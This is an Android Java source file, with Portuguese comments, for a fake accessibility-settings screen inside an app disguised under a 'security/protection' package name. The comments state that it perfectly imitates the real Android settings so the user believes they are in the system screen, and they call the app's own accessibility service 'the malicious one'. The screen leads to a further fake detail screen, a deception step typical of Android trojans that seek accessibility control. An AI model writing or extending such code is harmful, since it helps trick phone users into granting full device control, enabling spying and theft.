package com.seguranca.protecao;

import android.content.Intent;
import android.os.Bundle;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import com.google.android.material.appbar.MaterialToolbar;

/**
 * TELA FALSA DE ACESSIBILIDADE
 * 
 * Esta Activity imita PERFEITAMENTE a tela de configurações de acessibilidade do Android.
 * O usuário pensa que está nas configurações reais do sistema, mas está em uma tela falsa.
 * 
 * IMPORTANTE: Esta NÃO é a tela real do Android Settings!
 */
public class FakeAccessibilityActivity extends AppCompatActivity {

    private MaterialToolbar toolbar;
    private LinearLayout llOurService;
    private TextView tvServiceStatus;
    private PermissionManager permissionManager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.fake_accessibility_screen);

        permissionManager = new PermissionManager(this);

        toolbar = findViewById(R.id.toolbar);
        llOurService = findViewById(R.id.llOurService);
        tvServiceStatus = findViewById(R.id.tvServiceStatus);

        // Configura o botão de voltar na toolbar
        toolbar.setNavigationOnClickListener(v -> finish());

        // Configura o clique no nosso serviço (o malicioso)
        llOurService.setOnClickListener(v -> {
            // Abre a tela de detalhes do serviço (também falsa)
            openServiceDetail();
        });

        updateServiceStatus();
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateServiceStatus();
    }

    /**
     * Atualiza o status mostrado do serviço
     */
    private void updateServiceStatus() {
        if (permissionManager.isAccessibilityServiceEnabled()) {
            tvServiceStatus.setText(R.string.service_on);
        } else {
            tvServiceStatus.setText(R.string.service_off);
        }
    }

    /**
     * Abre a tela de detalhes do serviço (também FALSA)
     */
    private void openServiceDetail() {
        Intent intent = new Intent(this, FakeServiceDetailActivity.class);
        startActivity(intent);
    }
}
